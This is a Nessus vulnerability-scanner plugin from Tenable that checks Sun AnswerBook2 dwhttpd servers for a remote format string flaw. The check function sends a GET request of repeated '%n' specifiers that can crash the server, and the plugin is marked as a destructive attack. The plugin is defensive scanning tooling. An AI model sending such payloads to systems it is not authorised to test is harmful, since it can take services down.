#
# (C) Tenable Network Security, Inc.
#

# Script audit and contributions from Carmichael Security
#      Erik Anderson <eanders@carmichaelsecurity.com> (nb: this domain no longer exists)
#      Added BugtraqID
#      This script could also cover BID:1556 and CVE-2000-0697
#
# *untested*
#
# References:
#
# Date:  Thu, 1 Aug 2002 16:31:40 -0600 (MDT)		      
# From: "ghandi" <ghandi@mindless.com>			      
# To: bugtraq@securityfocus.com				      
# Subject: Sun AnswerBook2 format string and other vulnerabilities
#
# Affected:
# dwhttp/4.0.2a7a, dwhttpd/4.1a6
# And others?


include("compat.inc");

if(description)
{
 script_id(11075);
 script_version ("$Revision: 1.30 $");
 script_bugtraq_id(5384);
 script_osvdb_id(56995);

 script_name(english:"Sun AnswerBook2 Web Server dwhttpd GET Request Remote Format String");
 
 script_set_attribute(attribute:"synopsis", value:
"It is possible to execute code on the remote host." );
 script_set_attribute(attribute:"description", value:
"The remote web server is vulnerable to a format string attack.

An attacker may exploit this vulnerability to cause the web server
to crash continually or even execute arbitrary code on the system." );
 script_set_attribute(attribute:"solution", value:
"Upgrade your software or protect it with a filtering reverse proxy." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2002/08/14");
 script_cvs_date("$Date: 2012/06/25 21:53:36 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 script_summary(english:"DynaWeb server vulnerable to format string");
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2002-2012 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");
 script_require_ports("Services/www", 8888);
 script_dependencie("find_service1.nasl", "httpver.nasl", "http_version.nasl");
 exit(0);
}

########

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

function check(port)
{
 local_var	banner, i, r;

 banner = get_http_banner(port: port);
 if ( "dwhttp/" >!< banner ) return 0;

 if(http_is_dead(port: port)) { return(0); }

 i = string("/", crap(data:"%n", length: 100));
 r = http_send_recv3(method:"GET", port: port, item: i, exit_on_fail: 0);
 if(http_is_dead(port: port, retry:2)) { security_hole(port); }
}

ports = add_port_in_list(list:get_kb_list("Services/www"), port:8888);
foreach port (ports)
{
 check(port:port);
}
